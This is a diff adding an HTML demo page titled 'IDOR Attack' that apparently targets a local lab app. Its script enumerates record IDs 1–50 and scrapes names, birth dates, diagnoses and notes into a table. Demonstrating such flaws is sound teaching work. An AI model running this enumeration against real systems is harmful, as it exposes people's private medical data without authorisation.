@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>IDOR Attack</title>
+</head>
+
+<body>
+    <div class="container">
+        <h1>IDOR Attack</h1>
+
+        <hr>
+
+        <h2>Manual Test</h2>
+        <ul>
+            <li><a href="http://localhost:5000/record/1" target="_blank">/record/1</a></li>
+            <li><a href="http://localhost:5000/record/2" target="_blank">/record/2</a></li>
+        </ul>
+
+        <hr>
+
+        <h2>Automated Enumeration</h2>
+        <button onclick="enumerate()">Enumerate Records</button>
+        <div id="results"></div>
+    </div>
+
+    <script>
+        async function enumerate() {
+            const resultsDiv = document.getElementById('results');
+            resultsDiv.innerHTML = '<p>Enumerating records...</p>';
+            let found = 0;
+            let html = '<table border="1"><tr><th>ID</th><th>Name</th><th>DOB</th><th>Diagnosis</th><th>Notes</th></tr>';
+
+            for (let id = 1; id <= 50; id++) {
+                try {
+                    const resp = await fetch('/record/' + id);
+                    if (resp.ok) {
+                        const text = await resp.text();
+                        const parser = new DOMParser();
+                        const doc = parser.parseFromString(text, 'text/html');
+                        const cells = doc.querySelectorAll('td');
+                        if (cells.length >= 6) {
+                            html += '<tr>';
+                            html += '<td>' + cells[0].textContent + '</td>';
+                            html += '<td>' + cells[2].textContent + '</td>';
+                            html += '<td>' + cells[3].textContent + '</td>';
+                            html += '<td>' + cells[4].textContent + '</td>';
+                            html += '<td>' + cells[5].textContent + '</td>';
+                            html += '</tr>';
+                            found++;
+                        }
+                    }
+                } catch (e) {
+                    // skip
+                }
+            }
+
+            html += '</table>';
+            resultsDiv.innerHTML = '<p>Found ' + found + ' records by enumerating IDs 1-50:</p>' + html;
+        }
+    </script>
+</body>
+
+</html>
